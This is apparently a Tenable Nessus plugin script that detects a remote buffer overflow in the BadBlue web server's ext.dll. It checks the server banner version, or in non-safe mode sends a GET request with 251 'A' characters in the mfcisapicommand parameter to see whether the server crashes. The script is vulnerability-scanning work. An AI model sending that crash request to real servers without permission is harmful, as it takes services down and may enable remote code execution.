#
# (C) Tenable Network Security
#


if (description) {
  script_id(17241);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(12673);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"12673");
  }

  script_name(english:"BadBlue MFCISAPICommand Remote Buffer Overflow Vulnerability");
  desc["english"] = "
The remote host is running a version of BadBlue http server that has a
buffer overflow vulnerability in Ext.Dll, a module that handles http
requests.  A remote attacker can leverage this vulnerability by
sending an http request containing a mfcisapicommand parameter with
more than 250 chars to kill the web server and possibly execute code
remotely. 

Solution : Upgrade to BadBlue 2.60.0 or later.

Risk factor : High";
  script_description(english:desc["english"]);

  summary["english"] = "Detects MFCISAPICommand remote buffer overflow vulnerability in BadBlue";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  family["english"] = "Gain a shell remotely";
  script_family(english:family["english"]);

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nes", "http_version.nasl");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!port) exit(0);
if (!get_port_state(port)) exit(0);

if(safe_checks())
{

 banner = get_http_banner(port:port);
 if(!banner)exit(0);
 vulnerable = egrep(pattern:"^Server: BadBlue/([0-1]\.|2\.[0-5][^0-9])", string:banner);
 if(vulnerable)security_hole(port);

 exit (0);
}
else
{
 if (http_is_dead(port:port)) exit(0);

 # Send a malicious request.
 soc = http_open_socket(port);
 if (!soc) exit(0);
 req = string(
  "GET /ext.dll?mfcisapicommand=",
  crap(length:251, data:"A"),
  "&page=index.htx"
 );
 send(socket:soc, data: req);
 http_recv(socket: soc);
 http_close_socket(soc);

 # If the server's down, it's a problem.
 if (http_is_dead(port:port)) security_hole(port);
}
